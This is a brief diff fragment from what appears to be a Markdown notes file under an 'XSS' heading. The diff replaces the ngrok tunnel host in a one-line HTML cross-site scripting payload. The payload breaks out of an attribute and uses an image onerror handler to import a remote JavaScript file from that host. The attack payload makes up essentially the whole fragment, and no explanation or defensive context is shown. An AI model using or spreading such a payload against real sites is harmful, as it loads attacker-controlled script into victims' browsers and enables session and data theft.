@@ -67,7 +67,7 @@ Hello World :-)
 # XSS
 
 ```html
-"><img/src=x onerror=import("https://e949-83-213-97-233.ngrok-free.app/1.js")>
+"><img/src=x onerror=import("https://664a-83-213-97-233.ngrok-free.app/1.js")>
 ```
 
 ```js
